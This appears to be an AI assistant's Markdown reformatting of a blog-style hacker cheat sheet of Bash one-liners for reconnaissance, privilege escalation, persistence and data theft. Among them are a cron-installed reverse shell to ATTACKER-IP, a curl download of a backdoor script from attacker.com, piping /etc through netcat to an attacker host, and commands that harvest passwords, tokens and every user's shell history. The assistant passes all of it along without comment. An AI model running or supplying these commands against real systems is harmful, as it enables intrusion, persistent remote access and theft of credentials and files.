Sure! Here's a clean and well-formatted Markdown version of your content:

```markdown
# 15+ Linux Bash One-Liners Hackers Use (And You Should Too!)  
**By Very Lazy Tech 👾**  
*Published: Jul 30, 2025 · 3 min read*

✨ *Link in the first comment*

Linux power users and ethical hackers know the true power of the terminal lies in concise, clever one-liners. These one-liners can automate tasks, extract hidden data, escalate privileges, scan systems, and much more — all in a single line of Bash.

Below are 15+ elite Bash one-liners that every penetration tester, red teamer, or Linux enthusiast should add to their toolbox.

---

## 🔥 Core Info Gathering & Recon

1. **Start a Quick Web Server (for file transfers/payloads)**  
   ```bash
   python3 -m http.server 8080
   ```
   Use this to exfil data, serve payloads, or quickly download tools to a compromised host.

2. **Find All SUID Binaries (Privilege Escalation)**  
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
   Look for binaries that execute as root. Combine with GTFOBins to exploit.

3. **List All Cron Jobs Across Users**  
   ```bash
   for user in $(cut -d: -f1 /etc/passwd); do crontab -u $user -l 2>/dev/null; done
   ```
   Great for persistence discovery and privilege escalation.

4. **Basic Port Scan with Bash (when tools are restricted)**  
   ```bash
   for port in {20..1024}; do (echo >/dev/tcp/10.10.10.5/$port) && echo "Port $port open"; done 2>/dev/null
   ```
   Lightweight alternative to nmap.

5. **Check All Network Interfaces + IPs**  
   ```bash
   ip a | grep inet
   ```
   Useful inside isolated subnets or pivoted hosts.

---

## 🕵️‍♂️ Enumeration & Post-Exploitation

6. **List Users (spot service/system accounts)**  
   ```bash
   cut -d: -f1 /etc/passwd
   ```

7. **Discover World-Writable Files (misconfig alert!)**  
   ```bash
   find / -type f -perm -o+w 2>/dev/null
   ```

8. **Search for Passwords or Secrets in Config Files**  
   ```bash
   grep -iR 'password\|secret\|key\|token' /etc 2>/dev/null
   ```

9. **Monitor Real-Time Network Connections**  
   ```bash
   watch -n 1 ss -tuna
   ```

10. **View Bash History Across All Users**  
   ```bash
   find /home /root -name ".*history" -exec cat {} \; 2>/dev/null
   ```

---

## 🧠 Data Extraction & Movement

11. **Transfer Files to Remote Machine over SSH**  
   ```bash
   scp payload.sh user@192.168.1.5:/tmp
   ```

12. **Transfer & Extract Compressed Payloads On-the-Fly**  
   ```bash
   tar czf - /loot | ssh user@remote "tar xzf - -C /tmp"
   ```

13. **Grab Email Addresses from a File System**  
   ```bash
   grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,6}" * 2>/dev/null | sort -u
   ```

14. **Extract Unique IPs from Logs (Quick Threat Intel)**  
   ```bash
   grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' /var/log/* 2>/dev/null | sort -u
   ```

15. **Download File Silently with Curl (Payloads, Tools)**  
   ```bash
   curl -sO http://attacker.com/backdoor.sh
   ```

---

## 💣 Persistence, Priv-Esc & Lateral Movement

16. **Add a Backdoor Reverse Shell to Cron (Demo only)**  
   ```bash
   echo "* * * * * bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1" | crontab -
   ```

17. **Find Writable Directories (Good for Dropping Files)**  
   ```bash
   find / -type d -writable 2>/dev/null
   ```

18. **Compress and Exfiltrate via Netcat (Old but gold)**  
   ```bash
   tar czf - /etc | nc ATTACKER-IP 1234
   ```
   Start listener on attack box:  
   ```bash
   nc -lvp 1234 > data.tar.gz
   ```

19. **Check for Running Docker Containers (Escape Paths)**  
   ```bash
   docker ps -a 2>/dev/null
   ```

20. **Get Root’s Mail (Yes, people still leave secrets there)**  
   ```bash
   cat /var/mail/root 2>/dev/null
   ```

---

## 🎭 Obfuscation, Encoding, Decryption

21. **Decode Base64 Payloads**  
   ```bash
   echo 'U29ja3M=' | base64 -d
   ```

22. **Convert Hex to ASCII (Useful for C2 traffic)**  
   ```bash
   echo 4861636b | xxd -r -p
   ```

23. **Generate Strong Passwords Fast**  
   ```bash
   tr -dc A-Za-z0-9 </dev/urandom | head -c 16; echo
   ```

24. **Check System Info in One Shot (Pivot Context)**  
   ```bash
   whoami && uname -a && id && uptime
   ```

---

## 🎉 Join the VeryLazyTech Community

Become a **VeryLazyTech** member and level up your skills! 🎁  
Visit our shop for e-books and courses. 📚

**Follow us on:**
- ✖ Twitter: [@VeryLazyTech](https://twitter.com/VeryLazyTech)
- 👾 GitHub: [@VeryLazyTech](https://github.com/VeryLazyTech)
- 📜 Medium: [@VeryLazyTech](https://medium.com/@VeryLazyTech)
- 📺 YouTube: [@VeryLazyTech](https://youtube.com/@VeryLazyTech)
- 📩 Telegram: [@VeryLazyTech](https://t.me/VeryLazyTech)
- 🕵️‍♂️ Website: [VeryLazyTech](https://verylazytech.com)
```

Let me know if you'd like this styled for a blog post, presentation, or printable cheat sheet!
